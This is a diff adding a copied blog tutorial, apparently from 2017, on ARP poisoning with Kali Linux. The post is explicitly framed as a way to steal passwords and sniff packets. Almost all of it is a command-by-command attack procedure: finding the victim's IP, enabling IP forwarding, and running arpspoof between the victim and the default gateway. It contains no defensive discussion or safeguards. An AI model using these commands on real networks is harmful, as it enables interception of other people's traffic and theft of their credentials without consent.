@@ -1,0 +1,29 @@
+https://blackhatinside.wordpress.com/2017/01/15/how-to-do-arp-poisoning-spoofing-with-kali-linux-2016-2-arpspoof-wireshark-steal-passwords-sniff-packets/
+https://www.youtube.com/watch?v=L0xIid0eFQc
+
+How to do arp poisoning / spoofing with Kali Linux 2016.2 | arpspoof | wireshark | steal passwords | sniff packets
+Posted by HACKER-INSIDE on JANUARY 15, 2017
+First find the IP address of victim.
+#ifconfig
+
+Now check the arp table , it will show only router’s mac address.
+#arp
+
+Ping the victim machine and again check arp table , it will get added to it.
+#ping Victim-IP
+#arp
+
+For arp poisoning / spoofing we have to set up IP forwarding.
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Check your default gateway.
+#ip route
+
+Find the network interface.
+#ifconfig
+
+Now start the arp poisoning / spoofing.
+#arpspoof -i eth0 -t victimIP -r DefaultGateway
+-i is for interface.
+-t is for target.
+-r is for default gateway.
